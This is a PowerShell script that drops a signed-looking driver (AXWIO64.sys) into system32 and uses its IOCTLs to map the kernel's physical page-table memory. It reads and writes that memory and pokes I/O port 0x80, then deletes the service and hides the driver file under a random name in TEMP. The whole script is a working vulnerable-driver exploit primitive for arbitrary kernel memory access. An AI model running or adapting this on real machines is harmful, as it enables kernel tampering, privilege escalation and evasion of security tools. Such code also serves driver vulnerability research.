Clear-Host
Write-Host

try {
    Copy-Item `
        -Path (Join-Path $PSScriptRoot "AXWIO64.sys") `
        -Destination "$env:windir\system32\AxWIO.sys" `
        -ErrorAction SilentlyContinue | Out-Null
} catch {}

$Buffer     = $null
$SizeToRead = 12

$VA      = Get-KernelBaseAddress
$PA      = Resolve-DirectoryTable -VA64 $VA -ProcessID 4
$hDevice = Get-FileHandle -FileName AxWIO

# phys_mem_buf_t layout (40 bytes):
#   [Int64] mapping_size      @ 0x00
#   [Int64] physical_address  @ 0x08
#   [Int64] section_handle    @ 0x10
#   [Int64] virtual_address   @ 0x18
#   [Int64] section_object    @ 0x20
#
# port_buf_t layout (7 bytes, packed):
#   [Int16] port   @ 0x00
#   [Int32] value  @ 0x02
#   [Byte]  size   @ 0x06

try {

  # ~~~~~~~~~ @
  # Read Case @
  # ~~~~~~~~~ @

  try {
    $MapSize  = [Int64]0x1000
    $InOutPtr = New-IntPtr -Size 40 -TypeSize ([Int64], [Int64], [Int64], [Int64], [Int64]) `
        -Values ($MapSize, $PA, 0L, 0L, 0L)

    $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x80102040 `
        -InOutPtr $InOutPtr -InputSize 40 -OutputSize 40

    $MappedVA = [marshal]::ReadInt64($InOutPtr, 0x18)

    [String]::Format("DeviceIO Read Call --> {0} (VA: 0x{1:X})", $InvokeCall.Success, $MappedVA)

    if ($InvokeCall.Success -and $MappedVA -ne 0) {
        $Buffer = [Byte[]]::new($SizeToRead)
        [marshal]::Copy([IntPtr]$MappedVA, $Buffer, 0, $SizeToRead)

        Write-Host
        $Buffer | Format-HexView -Mode 8x
    }

    # ~~~~~~~~~~ @
    # Write Case @
    # ~~~~~~~~~~ @

    if ($Buffer -and $MappedVA -ne 0) {
        Write-Host
        [marshal]::Copy($Buffer, 0, [IntPtr]$MappedVA, $Buffer.Length)
        [String]::Format("DeviceIO Write Call --> Wrote {0} bytes to VA 0x{1:X}", $Buffer.Length, $MappedVA)
    }

    # ~~~~~~~~~ @
    # Unmap     @
    # ~~~~~~~~~ @

    if ($MappedVA -ne 0) {
        $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x80102044 `
            -InOutPtr $InOutPtr -InputSize 40 -OutputSize 0
        [String]::Format("Unmap VA 0x{0:X} --> {1}", $MappedVA, $InvokeCall.Success)
    }
  } finally {
      Free-IntPtr $InOutPtr -Method Auto
  }

  # ~~~~~~~~~~~~~~~~~ @
  # I/O Port Read     @
  # ~~~~~~~~~~~~~~~~~ @

  try {
    $Port    = [Int16]0x80       # example: POST diagnostic port
    $PortSz  = [Byte]1           # read size: 1=byte, 2=word, 4=dword
    $PortPtr = [marshal]::AllocHGlobal(8)
    [marshal]::WriteInt16($PortPtr, 0, $Port)
    [marshal]::WriteInt32($PortPtr, 2, 0)
    [marshal]::WriteByte($PortPtr, 6, $PortSz)

    $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x80102050 `
        -InOutPtr $PortPtr -InputSize 7 -OutputSize 4

    $PortVal = [marshal]::ReadInt32($PortPtr, 0)
    [String]::Format("`nPort Read 0x{0:X} --> {1} (Value: 0x{2:X})", $Port, $InvokeCall.Success, $PortVal)
  } finally {
      if ($PortPtr) { [marshal]::FreeHGlobal($PortPtr); $PortPtr = $null }
  }

  # ~~~~~~~~~~~~~~~~~ @
  # I/O Port Write    @
  # ~~~~~~~~~~~~~~~~~ @

  try {
    $Port    = [Int16]0x80
    $WriteVal = [Int32]0x00
    $PortSz  = [Byte]1
    $PortPtr = [marshal]::AllocHGlobal(8)
    [marshal]::WriteInt16($PortPtr, 0, $Port)
    [marshal]::WriteInt32($PortPtr, 2, $WriteVal)
    [marshal]::WriteByte($PortPtr, 6, $PortSz)

    $InvokeCall = Invoke-IoctlCall -Mode 1 -FileHandle $hDevice -IoCtrlCode 0x80102054 `
        -InOutPtr $PortPtr -InputSize 7 -OutputSize 0

    [String]::Format("Port Write 0x{0:X} = 0x{1:X} --> {2}", $Port, $WriteVal, $InvokeCall.Success)
  } finally {
      if ($PortPtr) { [marshal]::FreeHGlobal($PortPtr); $PortPtr = $null }
  }

} finally {
  if ($hDevice) {
      Free-IntPtr $hDevice -Method NtHandle
  }
}

$TempDir   = $env:TEMP
$SourceDir = "$env:windir\System32"

$Binary = @("AxWIO")
$Binary | % {
    $DriverPath = Join-Path -Path $SourceDir -ChildPath "$_.sys"
    $DestPath   = Join-Path -Path $TempDir   -ChildPath ([guid]::NewGuid().ToString())
    Stop-Service -Name $_ -ea 0
    sc.exe delete $_ | Out-Null
    if (Test-Path $DriverPath) {
	    Move-Item -Path $DriverPath -Destination $DestPath -Force -ea 0
    }
}
